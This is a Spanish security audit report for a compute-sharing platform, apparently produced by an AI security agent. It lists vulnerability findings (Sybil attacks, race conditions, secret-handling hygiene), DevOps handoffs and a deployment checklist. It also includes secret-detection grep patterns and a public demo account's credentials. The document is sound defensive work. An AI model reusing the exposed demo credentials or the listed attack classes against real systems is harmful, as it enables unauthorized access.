| SEC-23 | ALTO | Sybil attack en consenso | PENDIENTE |
| SEC-24 | ALTO | Race condition en `credit_reward` | PENDIENTE |
| SEC-25 | MEDIO | CSV sin sanitizacion de encabezados | PENDIENTE |
| SEC-26 | MEDIO | DoS por jobs/chunks masivos | PENDIENTE |
| SEC-27 | MEDIO | Datos del cliente visibles al proveedor | ACEPTADO (MVP) |
| SEC-28 | MEDIO | Sin validacion de `operation` en el worker | PENDIENTE |
| SEC-29 | MEDIO | Worker sin sandbox | ACEPTADO (MVP) |
| SEC-30 | BAJO | Limite de max_chunks sin rate limiting de respaldo | PENDIENTE (depende SEC-21) |
| SEC-31 | BAJO | `duration_ms` auto-reportado sin limite superior | PENDIENTE |
| SEC-32 | BAJO | RLS nuevo replica bypass total | ACEPTADO (deuda tecnica) |

### Verificacion de hallazgos del Code Reviewer anterior

| # | Hallazgo del Code Reviewer | Verificado en codigo | Severidad asignada |
|---|---------------------------|---------------------|--------------------|
| 1 | Sin chunk assignment timeout | CONFIRMADO — `MAX_CHUNK_ATTEMPTS=5` existe pero no hay timeout de `assigned` | ALTO (SEC-22) |
| 2 | Sin rate limiting en `/work/claim` | CONFIRMADO — no hay ninguna restriccion | ALTO (SEC-21) |
| 3 | Credenciales worker en CLI `--password` | CONFIRMADO — argumento posicional en `main.py` y `run_workers.sh` | ALTO (SEC-20) |
| 4 | Sybil attack en consenso | CONFIRMADO — sin verificacion de identidad real | ALTO (SEC-23) |
| 5 | CSV sin sanitizar llega al worker | CONFIRMADO — solo `.strip()` en encabezados | MEDIO (SEC-25) |

---

## Handoff para DevOps — Feature Cómputo Real

### Acciones bloqueantes pre-deploy (CRITICO/ALTO — deben resolverse antes de ir a produccion)

**URGENTE INMEDIATO — SEC-19 — Credenciales de produccion en `backend/.env`**

El archivo `backend/.env` contiene la `SUPABASE_SERVICE_ROLE_KEY` activa, la contrasena de la base de datos PostgreSQL y el `JWT_SECRET_KEY` de produccion. Aunque el `.gitignore` lo excluye correctamente, el riesgo de filtracion por acceso a la maquina de desarrollo o por inclusion accidental en artefactos es CRITICO.

Acciones inmediatas:
1. Verificar con `git log --all --full-history -- backend/.env` que el archivo nunca fue committado.
2. Rotar en Supabase Dashboard: regenerar `service_role key` y cambiar la contrasena del usuario de base de datos.
3. Mover las credenciales reales a variables de entorno del sistema o a un gestor de secretos (nunca en archivo de texto en el repositorio).
4. Instalar `gitleaks` o `detect-secrets` como hook de pre-commit para prevenir futuros accidentes.

**SEC-20 — Contrasena del worker en CLI**

Cambiar el worker para leer la contrasena desde `WORKER_PASSWORD` (variable de entorno) en lugar de `--password`. Actualizar `run_workers.sh` para no incluir valores por defecto de contrasena.

**SEC-21 — Rate limiting en `/work/claim`**

Aplicar `slowapi` en el endpoint `/work/claim` con limite por `provider_id`. Sin esto, un proveedor puede monopolizar todos los chunks disponibles.

**SEC-22 — Timeout de chunks asignados**

Implementar un job de mantenimiento (cron o Supabase scheduled function) que resetee a `pending` los chunks en estado `assigned` desde hace mas de 10 minutos. Sin esto, los crashes de workers dejan jobs bloqueados permanentemente.

**SEC-23 — Sybil attack en consenso**

Para el MVP: anadir un limite maximo de chunks asignados simultaneamente por `provider_id` en el mismo `job_id`. Esto no elimina el ataque pero lo hace ineficiente. Documentar el riesgo residual.

**SEC-24 — Race condition en `credit_reward`**

Aplicar la misma correccion de SEC-01 (UPDATE atomico) a `update_wallet_on_task_complete`. El flujo de pago de chunks es el camino critico del sistema.

### Acciones de prioridad media (MEDIO — primera semana tras deploy)

**SEC-25 — Sanitizacion de encabezados CSV**

Anadir regex de sanitizacion en `split_csv` antes de que los encabezados lleguen al payload del chunk. Trabajo estimado: 2-3 horas.

**SEC-26 — Limite de jobs activos por usuario**

Anadir un maximo de jobs activos por cliente (5-10) y validacion del tamano del body JSON inline. Trabajo estimado: 4 horas.

**SEC-28 — Validacion de `operation`**

Anadir lista blanca de operaciones permitidas en el servidor y en el plugin del worker. Trabajo estimado: 1 hora.

### Riesgos aceptados como deuda de MVP (documentados, no requieren accion inmediata)

- **SEC-27** (datos del cliente visibles al proveedor): es el modelo de negocio de la plataforma. Documentar en terminos de servicio.
- **SEC-29** (worker sin sandbox): el plugin actual no tiene RCE. Requiere accion antes de anadir plugins con subprocess.
- **SEC-32** (RLS sin efecto real): idem SEC-05, deuda tecnica del modelo de autenticacion del MVP.

---

## Checklist de Seguridad para Despliegue Público (Feature 04 — Landing + Deploy)

**Fecha:** 2026-06-08

### Secretos y configuración

- [ ] Todos los secretos configurados **solo** en el panel del hosting (Vercel / Railway env vars), nunca en el repositorio
- [ ] `SUPABASE_SERVICE_ROLE_KEY` presente **únicamente** en las variables de entorno del backend (Railway/Render). El frontend nunca debe tener acceso a esta clave
- [ ] `JWT_SECRET_KEY` generado con `openssl rand -hex 32` y configurado en Railway. Mínimo 32 caracteres
- [ ] `ENVIRONMENT=production` activo en el servidor de backend → desactiva `/docs`, `/redoc`, `/openapi.json`
- [ ] `FRONTEND_URL` apunta exactamente al dominio de Vercel sin trailing slash (ej. `https://co-computing.vercel.app`). **Sin wildcard `*`**
- [ ] `VITE_API_URL` en Vercel apunta a la URL pública del backend en Railway (ej. `https://co-computing-api.up.railway.app`)
- [ ] `SUPABASE_DB_URL` incluye `?sslmode=require` al final de la cadena de conexión

### Backend en producción

- [ ] Verificar que `GET /health` devuelve únicamente `{"status":"ok"}` en producción (sin campo `environment`)
- [ ] Verificar que `GET /docs`, `/redoc` y `/openapi.json` devuelven 404 en producción
- [ ] Verificar que `Access-Control-Allow-Origin` en las respuestas coincide exactamente con el dominio del frontend (no `*`)
- [ ] El servidor arranca con `--proxy-headers` si hay proxy reverso (Railway lo gestiona automáticamente)

### Frontend en producción

- [ ] `npm run build` completa sin errores antes del despliegue
- [ ] `vercel.json` con `rewrites` está en la carpeta `frontend/` para que el SPA funcione correctamente
- [ ] `VITE_API_URL` configurada como variable de entorno en Vercel (Settings → Environment Variables), no hardcodeada en el código
- [ ] Los source maps de producción no son accesibles públicamente (configurar `sourcemap: false` en `vite.config.ts` si es necesario)

### Base de datos

- [ ] En producción ejecutar **únicamente**: `001_schema.sql`, `002_rls.sql`, `003_seed_tasks.sql` (o solo las tareas del seed, no la cuenta demo)
- [ ] **NO** ejecutar `003_seed.sql` completo — contiene cuenta demo con credenciales públicas (`demo@co-computing.io` / `demo1234`)
- [ ] Ejecutar `migrations/005_client.sql` si se activa el lado cliente

### Landing page

- [ ] La ruta `/` muestra la landing pública sin requerir autenticación
- [ ] Los usuarios autenticados son redirigidos a `/dashboard` automáticamente al visitar `/`
- [ ] Los enlaces "Registrarse" e "Iniciar sesión" de la landing apuntan a `/registro` y `/login` respectivamente
- [ ] La landing es responsive en móvil (verificar en 375px de ancho)

---

## Auditoría — Publicación Vercel + Botón "Añadir créditos" — 2026-07-06

**Auditor:** Security Agent
**Referencia:** `briefs/05-vercel-creditos.md`; `docs/05-review.md`, sección "Revisión — Publicación Vercel + Botón 'Añadir créditos' — 2026-07-06" (Code Reviewer Senior)
**Alcance de esta sección:** (A) el mismo WIP de backend sin commitear que QA y el Code Reviewer ya identificaron y verificaron como bloqueante por **fiabilidad** (migración de psycopg2 a Supabase REST: `backend/app/db/supabase_client.py` nuevo/sin trackear, `backend/app/core/config.py` y `backend/app/db/queries/task_queries.py` modificados) — auditado aquí **exclusivamente desde el ángulo de seguridad**; doy por leído y válido el análisis de fiabilidad del Reviewer (import roto, colapso de los 71 tests, R3-CRIT-01, R3-CRIT-02, R3-MAYOR-01, R3-MAYOR-02) y no lo repito. (B) Confirmación estándar de los entregables reales del brief 05: botón "Añadir créditos" (`WalletPage.tsx`), CORS, `/docs`/`/redoc` en producción.

### Método de verificación

No me limité a leer el reporte del Reviewer ni a asumir el peor escenario posible; verifiqué cada pregunta contra evidencia concreta:

1. Inspeccioné el código fuente instalado de `supabase-py`, `postgrest` y `httpx` en este entorno (`Client.__init__`, `create_client`, `postgrest.exceptions.APIError`, `httpx._exceptions.RequestError`/`HTTPStatusError`) para responder con evidencia, no especulación, si el `service_role_key` puede llegar a interpolarse en un mensaje de excepción. **Nota de honestidad:** la versión resuelta localmente (`supabase==2.25.1`) difiere de la fijada en `backend/requirements.txt` (`supabase==2.10.0`); el comportamiento verificado abajo (orden de validación en `Client.__init__`, forma de `APIError`/`RequestError`) es estructural a la librería y estable entre versiones recientes, pero lo señalo por transparencia.
2. Releí `backend/app/main.py` completo para confirmar el comportamiento del handler genérico de excepciones y su relación (o no) con `settings.is_production`.
3. Repetí, de forma independiente y no solo citando al Reviewer, un `grep` de `supabase_db_url` sobre todo `backend/` para verificar el radio de impacto real de R3-CRIT-02 — encontré una ocurrencia adicional no listada en `docs/05-review.md` (ver hallazgo SEC-35).
4. Releí `backend/app/routers/tasks.py` para confirmar que la comprobación de propiedad (`provider_id` del recurso == `provider_id` del JWT) sigue intacta tras la reescritura de `task_queries.py` — esto es exactamente lo que el handoff del Reviewer (punto 5) pedía verificar si el WIP llegase a fusionarse; lo verifiqué ya ahora, en frío, para dejar constancia.
5. Confirmé con `git diff`, `git status --porcelain` y `git log --all --full-history -- backend/.env "**/.env"` el estado real del árbol de trabajo y del historial (sin alterarlo).
6. Leí `WalletPage.tsx` línea a línea en las zonas del botón (247–253) y el modal (514–533), y ejecuté un grep de patrones de secreto (`api[_-]?key`, `secret`, `password`, `Bearer`, `service_role`) sobre el fichero completo: cero coincidencias.
7. Grep de `os.environ`, `settings.dict()`/`model_dump()` y patrones de volcado de configuración sobre todo `backend/app/`: cero coincidencias — no hay ningún endpoint ni script nuevo que exponga variables de entorno o el objeto `settings` completo.

### Índice de hallazgos de este ciclo

| ID | Severidad | Resumen |
|----|-----------|---------|
| SEC-33 | MEDIO | `supabase_client.py`: cliente Supabase duplicado, construido de forma *eager* con `os.getenv` crudo y sin `SecretStr` — **no se confirma** fuga del `service_role_key` en el fallo ya reproducido por el Reviewer, pero el patrón amplía la superficie para una fuga futura por error humano |
| SEC-34 | BAJO | `except Exception: print(f"...: {e}")` en `task_queries.py` (3 funciones) — **no filtra** el `service_role_key` ni el DSN de PostgreSQL (verificado contra las clases de excepción reales), pero es un canal de log no estructurado, sin control de nivel, inconsistente con el logger del proyecto |
| SEC-35 | MEDIO | `supabase_db_url` opcional (R3-CRIT-02): **no se confirma** fuga de stack trace/connection string al cliente HTTP aunque `ENVIRONMENT` esté mal configurado (el handler genérico de excepciones no depende de `is_production`); pero el radio de impacto real alcanza también el camino de **pago a proveedores** (`wallet_queries.update_wallet_on_task_complete`), no solo escrow de cliente y cómputo |

Ningún hallazgo de esta sección alcanza severidad CRÍTICO o ALTO desde el ángulo de seguridad puro — la severidad CRÍTICA de este WIP ya está correctamente capturada por el Reviewer desde el ángulo de fiabilidad (R3-CRIT-01, R3-CRIT-02) y sigue siendo bloqueante para fusionar o desplegar tal cual, por esa razón. Ver "Constancia explícita" al final de esta sección.

---

#### SEC-33 — Cliente Supabase duplicado con construcción *eager* y `os.getenv` crudo — sin fuga confirmada, pero superficie ampliada

**CWE:** CWE-532 (Insertion of Sensitive Information into Log File) — de forma preventiva, no confirmada
**Severidad:** MEDIO
**Archivo:** `backend/app/db/supabase_client.py` (nuevo, sin trackear, 7 líneas)

**Pregunta original:** ¿hay riesgo de que el `service_role_key` se registre en algún log si `create_client` falla?

**Respuesta, con evidencia:** No, no en el escenario ya reproducido. Inspeccioné el código real de `supabase_client.Client.__init__` (el método que ejecuta `create_client`):

```python
if not supabase_url:
    raise SupabaseException("supabase_url is required")
if not supabase_key:
    raise SupabaseException("supabase_key is required")
if not re.match(r"^(https?)://.+", supabase_url):
    raise SupabaseException("Invalid URL")
```

Los tres mensajes son cadenas **estáticas**: ninguna interpola `supabase_url` ni `supabase_key`. El valor de la clave solo se usa *después* de pasar estas comprobaciones (para construir las cabeceras `apikey`/`Authorization`), así que en el escenario exacto que reprodujo el Reviewer (`SUPABASE_URL`/`SUPABASE_SERVICE_ROLE_KEY` ausentes → `None`), la excepción `SupabaseException: supabase_url is required` que se propaga hasta el traceback de import no contiene el valor de ninguna de las dos variables (no hay nada que filtrar: son `None`, y el mensaje ni las menciona). Además, esta excepción concreta ocurre en tiempo de *import* (`supabase = create_client(...)` es una sentencia a nivel de módulo) — antes de que exista el objeto `app` de FastAPI, por lo que ni siquiera llega al `@app.exception_handler(Exception)` de `main.py`; se manifiesta como traceback crudo de Python en stdout/stderr del proceso (terminal del desarrollador, logs del contenedor Docker/Railway, logs de CI), pero un traceback sin el valor de la clave no es una fuga de la clave.

**Lo que sí es un hallazgo real (preventivo):** este fichero introduce un **segundo mecanismo** para obtener credenciales de Supabase, independiente y con una fuente de verdad distinta al ya existente `app/db/client.py` (que lee de `app.core.config.settings`, validado por `pydantic-settings`, con inicialización perezosa vía `@lru_cache`). Dos problemas de higiene de secretos, no de explotabilidad inmediata:

1. **`os.getenv` crudo en vez de `settings`:** duplica la fuente de configuración y es exactamente el tipo de código que invita a un futuro desarrollador — depurando este mismo `SupabaseException` — a añadir un `print(SUPABASE_KEY)` o `print(f"URL={SUPABASE_URL} KEY={SUPABASE_KEY}")` ad hoc para diagnosticar por qué las variables llegan vacías. El patrón perezoso ya existente en `app/db/client.py` no elimina esta tentación, pero al menos concentra el acceso a la clave en un único punto auditable.
2. **Ninguno de los dos campos relacionados (`supabase_service_role_key` en `config.py`, ni las constantes módulo-nivel de este fichero nuevo) usa `pydantic.SecretStr`.** Con un `str` normal, si en el futuro alguien hace `print(settings)`, registra el objeto `Settings` completo, o Pydantic genera un `ValidationError` que incluya `input_value=...` para este campo (hoy no ocurre porque el campo no tiene validador propio, pero es una protección de defensa en profundidad barata de añadir), el valor en texto plano del `service_role_key` — la credencial que **bypasea RLS por completo** (ver SEC-05/SEC-19 arriba) — podría aparecer sin enmascarar. `SecretStr` habría hecho que cualquier `print`/`repr` accidental mostrara `**********` en vez del valor real.

**Impacto:** Bajo hoy (nada se filtra en el fallo actual, confirmado por lectura de código). Medio como deuda de higiene de secretos: reduce el margen de error humano alrededor de la credencial más privilegiada del sistema.

**Mitigación concreta:**
- Si se seguiel Opción A del Reviewer (revertir `supabase_client.py` a inexistente): este hallazgo queda cerrado automáticamente, no requiere acción adicional.
- Si se sigue la Opción B (conservar la migración a REST): eliminar `supabase_client.py` y que `task_queries.py` línea 150 use `get_supabase()` igual que las otras nueve funciones del fichero (esto también resuelve R3-CRIT-01 y R3-MAYOR-02 de una sola vez, tal como ya recomendó el Reviewer).
- Independientemente de A/B: envolver `supabase_service_role_key` y `jwt_secret_key` en `config.py` con `pydantic.SecretStr` en vez de `str`, y usar `.get_secret_value()` solo en el único punto donde se construye el cliente. Esto es una mejora de defensa en profundidad de bajo costo, no ligada a este WIP concreto.

**Estado actual:** SIN FUGA CONFIRMADA en el fallo reproducido. Recomendación de hardening PENDIENTE.

---

#### SEC-34 — `print(f"...: {e}")` en `task_queries.py`: canal de log no estructurado, sin fuga de credenciales confirmada

**CWE:** CWE-532 (Insertion of Sensitive Information into Log File), CWE-209 (Generation of Error Message Containing Sensitive Information) — evaluados y descartados para el secreto específico; el hallazgo residual es de higiene de logging
**Severidad:** BAJO
**Archivo:** `backend/app/db/queries/task_queries.py` — `decrement_slots_atomic` (líneas 95–97), `get_provider_assignments_history` (líneas 172–174), `get_assignment_with_task` (líneas 261–263)

**Pregunta original:** ¿el manejo de errores genérico en estas tres funciones podría filtrar datos sensibles (connection strings, tokens) a stdout/logs?

**Respuesta, con evidencia:** Verifiqué las dos clases de excepción realistas que estas funciones pueden capturar, ya que ambas viajan por HTTP a través de PostgREST (no usan psycopg2 — el propio docstring del fichero lo confirma: "Uses Supabase REST API exclusively"):

- `postgrest.exceptions.APIError` (error de negocio/esquema devuelto por PostgREST): su `__repr__` solo compone `code`, `message`, `hint` y `details`, todos ellos tomados del cuerpo JSON de error que devuelve PostgREST. Nunca incluye las cabeceras de la petición (`apikey`, `Authorization: Bearer <service_role_key>`) ni la URL completa con query params.
- `httpx.RequestError`/`HTTPStatusError` (error de red/transporte: timeout, DNS, conexión rechazada): el constructor (`RequestError.__init__(self, message, *, request=None)`) almacena un `message` de texto construido por `httpx`, no una copia de las cabeceras de la petición. `str(e)` no expone la cabecera `Authorization`.

Por tanto, el `service_role_key` **no debería** aparecer en el texto de `e` para ninguna de las dos rutas de fallo realistas de estas tres funciones. Esto es coherente con la propia verificación del Reviewer: el `SupabaseException` de import-time tampoco lo expone (ver SEC-33).

**Lo que sí sigue siendo un hallazgo real, aunque menor:** el uso de `print()` en vez de `logging.getLogger("co-computing")` (el logger que ya usa `main.py`) tiene tres efectos de seguridad/higiene, no de fuga de credenciales:

1. Bypasea el control de nivel de log de producción (`main.py` fija `logging.WARNING` en producción); un `print()` siempre escribe a stdout sin importar el nivel configurado, lo que en un contenedor puede mezclarse de forma no estructurada con el resto de la salida y complicar la redacción/filtrado si en el futuro se añade un procesador de logs que enmascare campos sensibles a nivel del logger (un `print` nunca pasaría por ese procesador).
2. Los campos `hint`/`details` de un `APIError` de PostgREST pueden, en general (no en estas tres funciones concretas hoy), incluir fragmentos de datos si el error proviene de una violación de constraint con valores literales (patrón clásico de Postgres: "Key (email)=(...) already exists"). Ninguna de las tres funciones auditadas aquí hace un INSERT/UPDATE con una constraint de unicidad que dispare ese sub-caso — `decrement_slots_atomic` hace un UPDATE condicional sin restricción de unicidad, y las otras dos son SELECT de solo lectura —, así que el riesgo concreto hoy es bajo, pero el patrón (capturar y volcar `str(e)` a un canal no controlado) es el mismo que sí sería explotable si se copia a una función futura que sí inserte/actualice con constraints.
3. Es exactamente el patrón que, aplicado a estas tres funciones y a ninguna otra del fichero, ya señaló el Reviewer como R3-MAYOR-01 desde el ángulo de fiabilidad (oculta errores de infraestructura como resultados de negocio). Desde el ángulo de seguridad, el mismo cambio de código tiene un efecto secundario interesante y no del todo negativo: al capturar la excepción y devolver `False`/`[]`/`None` en vez de dejarla propagar, estas tres funciones **nunca** llegan a exponer nada al cliente HTTP (ni siquiera el 500 genérico) — para el cliente externo, el fallo de infraestructura es indistinguible de una respuesta de negocio normal. Eso reduce la superficie de exposición *hacia el cliente* a cambio de aumentarla *hacia los logs del contenedor* (que ya está dentro del perímetro de confianza operacional, no expuesto a Internet). Es un cambio de superficie, no una fuga nueva hacia un atacante externo.

**Impacto:** Bajo. No hay fuga de credenciales confirmada. El riesgo residual es de higiene de logging y de un patrón replicable que podría volverse más serio si se copia a funciones con INSERT/UPDATE sensibles a constraints.

**Mitigación concreta:** La misma que ya recomendó el Reviewer en R3-MAYOR-01 (usar `logger.exception(...)` y re-lanzar) resuelve también este hallazgo de seguridad: centraliza el log en el canal estructurado del proyecto, recupera el nivel/formato consistentes, y permite en el futuro añadir un filtro de logging que redacte patrones de secretos si se considera necesario (p.ej. un `logging.Filter` que aplique regex sobre mensajes antes de emitirlos).

**Estado actual:** SIN FUGA DE CREDENCIALES CONFIRMADA. Hallazgo de higiene de logging PENDIENTE, de baja severidad, resoluble con el mismo fix que ya pide el Reviewer por fiabilidad.

---

#### SEC-35 — `supabase_db_url` opcional (R3-CRIT-02): sin fuga confirmada al cliente HTTP, pero radio de impacto más amplio de lo documentado

**CWE:** CWE-703 (Improper Check for Exceptional Conditions) — mismo CWE ya usado para SEC-22, por consistencia; ángulo de disponibilidad más que de divulgación
**Severidad:** MEDIO
**Archivos:** `backend/app/core/config.py` línea 10; `backend/app/main.py` líneas 33–40 y 73–79; `backend/app/db/queries/wallet_queries.py` línea 105 (hallazgo adicional, ver abajo)

**Pregunta original:** ¿un arranque "silencioso" sin `SUPABASE_DB_URL` podría dejar el sistema en un estado donde algunas rutas fallan revelando información (stack traces con la cadena de conexión) a un cliente externo si `ENVIRONMENT` no está bien puesto a `production`?

**Respuesta, con evidencia:** No debería, y esto es independiente de si `ENVIRONMENT` está bien configurado o no — verifiqué que **el handler genérico de excepciones no depende de `settings.is_production`**:

```python
# main.py líneas 73–79 — registrado incondicionalmente, sin gate de is_production
@app.exception_handler(Exception)
async def generic_exception_handler(request: Request, exc: Exception) -> JSONResponse:
    logger.exception("Unhandled exception: %s", exc)
    return JSONResponse(status_code=500, content={"detail": "Error interno del servidor"})
```

Y `app = FastAPI(...)` (líneas 33–40) no fija `debug=True` en ningún punto (el valor por defecto de FastAPI/Starlette es `debug=False`), lo cual importa porque si `debug=True` estuviera activo, Starlette mostraría su página HTML de traceback de depuración **en vez de** invocar este handler, sin importar el valor de `ENVIRONMENT`. Con la configuración actual, un `psycopg2.OperationalError` (el síntoma que describe el propio brief 05 y que confirma el Reviewer: "error de conexión a socket local") originado dentro de cualquier función de servicio, incluso una llamada desde un hilo del pool de FastAPI para una ruta síncrona, se propaga hasta este handler y el cliente HTTP solo ve `{"detail": "Error interno del servidor"}` con código 500 — nunca el mensaje real de `psycopg2` ni la cadena de conexión. Esto se cumple **incluso si `ENVIRONMENT` quedase mal configurado** (p. ej. olvidado en `development` en producción), porque el handler no consulta ese valor. Dicho de otro modo: la ausencia de fail-fast en el arranque (R3-CRIT-02) es un problema real, pero su materialización más probable no es una fuga de información al cliente — es un 500 genérico y repetido, indistinguible de cualquier otro error interno.

**Lo que sí encontré, de forma independiente, y que amplía lo ya documentado:** repetí el `grep` de `settings.supabase_db_url` sobre todo `backend/` (no solo sobre los ficheros que cita el Reviewer) y confirmé 12 puntos de uso sin ningún guard de `None`:
- `backend/app/db/queries/client_queries.py`: 7 ocurrencias (ya citadas por el Reviewer).
- `backend/app/db/queries/compute_queries.py`: 4 ocurrencias (ya citadas por el Reviewer).
- **`backend/app/db/queries/wallet_queries.py` línea 105, dentro de `update_wallet_on_task_complete`** — **no citada en la sección de este ciclo de `docs/05-review.md`**. Esta es precisamente la función que abona recompensas a proveedores al completar tareas (marcada C-03/R2-C-02 en revisiones anteriores por su propio problema de atomicidad) y que usa psycopg2 exactamente por el mismo motivo que escrow/cómputo: necesita un `UPDATE` aritmético atómico que el SDK REST de Supabase no puede expresar en una sola operación.

**Impacto de este hallazgo adicional:** El radio de impacto real de R3-CRIT-02, si `SUPABASE_DB_URL` faltase en Railway, no se limita a "escrow del cliente y jobs de cómputo" (como dice el brief 05 y repite el Reviewer) — también rompe, request a request y de la misma forma confusa, el **pago de recompensas a proveedores por tareas completadas**, que es tan camino-de-dinero-real como el escrow. Esto no cambia la severidad ya asignada por el Reviewer (sigue siendo CRÍTICO por fiabilidad), pero sí es información nueva y relevante para quien decida el fix: cualquier plan de mitigación para R3-CRIT-02 debe considerar `wallet_queries.py` además de `client_queries.py` y `compute_queries.py`.

**Mitigación concreta:** La misma que ya pide el Reviewer para R3-CRIT-02 (revertir a `str` obligatorio, o añadir un `@model_validator(mode="after")` que falle alto si es `None`) cubre automáticamente los 12 puntos de uso, incluido `wallet_queries.py`, porque el fallo se movería de vuelta al arranque del proceso. Adicionalmente, y esto sí es una recomendación puramente de seguridad/disponibilidad para DevOps: no depender únicamente del fail-fast de `pydantic-settings` como única red de seguridad — marcar `SUPABASE_DB_URL` como variable **requerida** en la configuración de Railway (si la plataforma lo permite) y/o añadir un healthcheck de arranque que abra una conexión psycopg2 real antes de aceptar tráfico, tal como ya pedía el punto 1 del handoff del Reviewer.

**Estado actual:** SIN FUGA AL CLIENTE HTTP CONFIRMADA (verificado). Radio de impacto ampliado con un punto de uso adicional no documentado previamente (`wallet_queries.py:105`). La severidad CRÍTICA por fiabilidad/disponibilidad ya asignada por el Reviewer a R3-CRIT-02 se mantiene y ahora cubre también el pago a proveedores.

---

### Verificación adicional — aislamiento por `provider_id` tras la reescritura de `task_queries.py` (sin hallazgos)

El propio Reviewer, en el punto 5 de su handoff, recomendó repetir la verificación de aislamiento por `provider_id`/`client_id` sobre las funciones reescritas de `task_queries.py` **si** el WIP llegase a fusionarse, ya que su lógica interna cambió por completo aunque sus firmas no. Adelanté esa verificación ahora, en frío, en vez de esperar a que se decida el destino del WIP:

- `get_assignment_with_task(assignment_id)` ya no filtra por `provider_id` en la query (ni lo hacía la versión anterior con psycopg2: el join solo filtraba por `id` de la asignación) — el campo `provider_id` se sigue devolviendo en el dict aplanado (línea 257 de la versión actual). Confirmé en `backend/app/routers/tasks.py` líneas 109–129 que la comprobación de propiedad sigue intacta en la capa de router: `if row["provider_id"] != current_provider["id"]: raise HTTPException(403, ...)`. **No hay regresión de autorización.**
- `get_provider_assignments_history(provider_id)` sigue filtrando por `provider_id` dentro de la propia query (`.eq("provider_id", provider_id)`), igual que la versión anterior con SQL crudo (`WHERE ta.provider_id = %s`). **No hay regresión.**

**Conclusión:** el WIP no introduce ningún problema nuevo de aislamiento/autorización entre proveedores. El riesgo de este WIP sigue siendo, según todo lo verificado por mí y por el Reviewer, de fiabilidad (crítico) y de higiene de secretos/logging (medio/bajo, hallazgos SEC-33 a SEC-35 arriba) — no de exposición cruzada de datos entre usuarios.

---

### Confirmaciones estándar de este ciclo

**CORS (`backend/app/main.py` líneas 46–52):** confirmado correcto, sin cambios. `allow_origins=[settings.frontend_url]` (una única entrada, sin wildcard `*`), `allow_credentials=True`, sin ningún valor hardcodeado a `localhost` en el camino de producción (el default `"http://localhost:5173"` de `config.py` línea 18 es solo el valor de fallback para desarrollo local y se sobreescribe por variable de entorno en Railway). Coincide con lo ya confirmado por Backend Dev.

**`/docs`, `/redoc`, `/openapi.json` en producción (`main.py` líneas 37–39):** confirmado correcto. Los tres quedan en `None` cuando `settings.is_production` es `True` (`docs_url=None if settings.is_production else "/docs"`, ídem `redoc_url` y `openapi_url`). `/health` (línea 100–104) también oculta el campo `environment` en producción, sin cambios este ciclo.

**Secretos hardcodeados en código nuevo de este ciclo:** ninguno encontrado.
- `frontend/src/pages/WalletPage.tsx`: el botón "Añadir créditos" (líneas 247–253) y su modal (líneas 514–533) son UI pura — un único `useState<boolean>` (`addCreditsOpen`), sin llamada a red, sin nuevo import de ningún cliente API. Grep de patrones de secreto sobre el fichero completo: cero coincidencias. Confirmado por lectura directa, no solo por el reporte del Reviewer.
- `backend/app/db/supabase_client.py`: no contiene ningún valor hardcodeado — lee de `os.getenv`, no de literales. El riesgo de este fichero es estructural (SEC-33), no un secreto hardcodeado.
- `backend/.env` existe en disco (pre-existente, ya documentado como SEC-19 en la auditoría de la feature de cómputo real) pero **no está trackeado por git** y **nunca apareció en el historial**: confirmado con `git ls-files backend/.env` (sin salida) y `git log --all --full-history -- backend/.env "**/.env"` (sin salida) ejecutados en este ciclo. La recomendación de rotar credenciales de SEC-19 sigue vigente y pendiente — no ha cambiado este ciclo.
- Grep de `os.environ`, `settings.dict()`/`model_dump()` sobre `backend/app/`: cero coincidencias. No se ha añadido ningún endpoint ni script que vuelque configuración o variables de entorno.

### Resumen ejecutivo de esta sección

| Severidad | Cantidad | IDs |
|-----------|----------|-----|
| CRÍTICO   | 0        | — (la severidad crítica de este WIP es de fiabilidad, ya cubierta por el Reviewer; ver nota arriba) |
| ALTO      | 0        | — |
| MEDIO     | 2        | SEC-33, SEC-35 |
| BAJO      | 1        | SEC-34 |
| **Total** | **3**    | |

Ninguno de los tres hallazgos de este ciclo es, por sí solo, bloqueante para producción. Los tres son mejoras de higiene de secretos/logging/documentación que deben aplicarse junto con el fix de fiabilidad de R3-CRIT-01/R3-CRIT-02 (Opción A o B del Reviewer), no en un ciclo separado — especialmente SEC-33, porque su fix natural es exactamente el mismo fix que ya resuelve R3-CRIT-01/R3-MAYOR-02 (eliminar `supabase_client.py` y usar `get_supabase()` en todo `task_queries.py`).

### Constancia explícita — `docs/06-security.md` sigue vigente

Tal como pide `briefs/05-vercel-creditos.md` en la sección "Roles con poco que hacer aquí" ("Security: repasa que `docs/06-security.md` sigue vigente sin cambios necesarios"), y respondiendo directamente al punto 4 del handoff del Reviewer en `docs/05-review.md` (que señaló, correctamente, que ningún rol dejó constancia escrita de haber revisado este ciclo desde el ángulo de seguridad):

**He revisado este ciclo (brief 05, Vercel + botón "Añadir créditos") de forma explícita y con evidencia (ver "Método de verificación" arriba). Confirmo que:**

1. El botón "Añadir créditos" (`WalletPage.tsx`) no introduce ninguna superficie de seguridad nueva: es UI sin llamada a red, sin secretos, sin estado persistente.
2. CORS y la desactivación de `/docs`/`/redoc`/`/openapi.json` en producción siguen correctos, sin cambios respecto a lo ya auditado.
3. El WIP de backend ajeno a este brief (migración psycopg2 → Supabase REST) **no** introduce ninguna fuga confirmada del `service_role_key` ni de connection strings hacia logs o hacia clientes HTTP, verificado con evidencia de código (no solo inferencia) — pero sí introduce tres hallazgos nuevos de higiene de seguridad de severidad MEDIO/BAJO (SEC-33, SEC-34, SEC-35), y no introduce ninguna regresión de aislamiento por `provider_id`.
4. Todos los hallazgos de las dos auditorías anteriores de este documento (SEC-01 a SEC-32) siguen vigentes tal cual, sin cambios de estado en ningún caso: no encontré evidencia de que ninguno de ellos se haya corregido ni de que ninguno haya dejado de aplicar. En particular, siguen pendientes sin mitigar: la race condition de retiros (SEC-01), el JWT en `localStorage` (SEC-04), la ausencia de rate limiting (SEC-02, SEC-21), la cuenta demo en el seed (SEC-06), el Sybil attack en consenso (SEC-23), y las credenciales reales en `backend/.env` en disco (SEC-19, sin cambios este ciclo).
5. No hay ningún cambio en el alcance de este ciclo (brief 05) que requiera modificar, retirar o matizar ningún hallazgo previo de este informe. **`docs/06-security.md` sigue vigente en su totalidad; esta sección es puramente aditiva.**

---

### Handoff para DevOps — ciclo Vercel + Créditos (seguridad)

1. **No es necesaria ninguna acción de seguridad urgente derivada del botón "Añadir créditos"** — es UI sin superficie nueva. Sin acción.

